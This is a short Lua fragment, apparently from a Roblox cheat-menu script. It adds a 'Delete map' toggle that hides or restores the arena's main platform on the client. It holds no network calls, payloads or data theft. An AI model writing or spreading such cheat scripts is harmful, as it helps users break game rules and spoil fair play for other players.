-- DELETE MAP
---------------------------------------------------------------------

local mapHidden = false
local savedPlatform = nil

local function getPlatform()
    local m = workspace:FindFirstChild("Map")
    if not m then return end
    local m1 = m:FindFirstChild("Map1")
    if not m1 then return end
    local ap = m1:FindFirstChild("ArenaParts")
    if not ap then return end
    return ap:FindFirstChild("MainPlatform")
end

local function hidePlatform()
    local plat = getPlatform()
    if not plat then return end
    if not savedPlatform then
        savedPlatform = plat:Clone()
        savedPlatform.Parent = nil
    end
    plat.Transparency = 1
    plat.CanCollide = false
end

local function showPlatform()
    local plat = getPlatform()
    if plat then
        plat.Transparency = 0
        plat.CanCollide = true
        return
    end
    if savedPlatform then
        savedPlatform.Parent = workspace.Map.Map1.ArenaParts
    end
end

tabShit:CreateToggle({
    Name = "Delete map",
    CurrentValue = false,
    Callback = function(v)
        mapHidden = v
        if v then hidePlatform() else showPlatform() end
    end
})

